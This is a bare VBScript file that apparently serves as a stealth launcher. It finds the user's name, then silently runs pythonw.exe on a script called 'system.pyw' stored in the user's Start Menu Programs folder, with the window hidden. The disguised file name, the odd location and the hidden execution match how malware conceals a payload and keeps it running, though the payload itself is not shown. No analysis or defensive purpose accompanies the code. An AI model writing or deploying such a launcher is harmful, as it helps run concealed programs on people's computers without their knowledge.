Set WshShell = CreateObject("WScript.Shell")
userName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
pythonPath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\pythonw.exe"
scriptPath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\system.pyw"
WshShell.CurrentDirectory = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
WshShell.Run chr(34) & pythonPath & Chr(34) & " " & Chr(34) & scriptPath & Chr(34), 0
Set WshShell = Nothing
